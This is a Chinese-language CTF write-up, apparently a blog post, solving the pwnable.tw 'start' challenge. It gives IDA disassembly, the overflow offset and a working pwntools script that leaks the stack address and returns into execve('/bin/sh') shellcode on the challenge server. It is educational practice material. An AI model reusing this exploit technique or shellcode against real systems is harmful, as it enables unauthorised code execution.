---
title: pwnable.tw start
tags: [CTF, pwn]
layout: post
categories: writeups
---


# Start

用IDA打开，程序其实是单纯用汇编写的，通过系统调用来输出`Let's start the CTF:`并获取输入。

``` asm
.text:08048060 _start          proc near
.text:08048060                 push    esp
.text:08048061                 push    offset _exit
.text:08048066                 xor     eax, eax
.text:08048068                 xor     ebx, ebx
.text:0804806A                 xor     ecx, ecx
.text:0804806C                 xor     edx, edx
.text:0804806E                 push    3A465443h
.text:08048073                 push    20656874h
.text:08048078                 push    20747261h
.text:0804807D                 push    74732073h
.text:08048082                 push    2774654Ch
.text:08048087                 mov     ecx, esp        ; addr
.text:08048089                 mov     dl, 14h         ; len
.text:0804808B                 mov     bl, 1           ; fd
.text:0804808D                 mov     al, 4
.text:0804808F                 int     80h             ; LINUX - sys_write
.text:08048091                 xor     ebx, ebx
.text:08048093                 mov     dl, 3Ch
.text:08048095                 mov     al, 3
.text:08048097                 int     80h             ; LINUX -
.text:08048099                 add     esp, 14h
.text:0804809C                 retn
```

使用`pattern_create`和`pattern_offset`获取到溢出的偏移是`20`


``` python
ret = 0x08048087

payload1 = 'A' * 20
payload1 += p32(ret)

p.recvuntil(':')
p.sendline(payload1)
leak = u32(p.recv(4))
print hex(leak)
```

在`_start`函数开始进行了`push    esp`和`push    offset _exit`，因此`retn`时会回到`_exit`函数继续执行。

因此，只要我们将这个`retn`返回地址覆盖，就可以转到任意地址继续执行。

这里我们将其覆盖为`0x08048087`，为什么呢？这里是`.text:08048087                 mov     ecx, esp        ; addr`，因为在其下的`sys_write`函数可以取出`esp`赋给`ecx`，然后输出`ecx`的内容。因此我们可以通过这样，泄漏出`saved esp`的位置

``` python
from pwn import *

debug = False
local = False
x86 = True

if debug:
    context.log_level = 'debug'
else:
    context.log_level = 'info'
if x86:
    libc = ELF('/lib32/libc.so.6')
    #libc = ELF('./libc-2.23.so')
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if local:
    p = process('./start')
else:
    p = remote('chall.pwnable.tw',10000)


shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
ret = 0x08048087 # mov     ecx, esp
payload1 = 'a'*20 + p32(ret) 
p.recvuntil(':')
p.send(payload1)
leak = u32(p.recv(4)) # leak saved_esp

#leak+20是因为retn前add     esp, 14h
payload2 = 'a'*20 + p32(leak+20)  + shellcode
p.send(payload2)
p.interactive()
```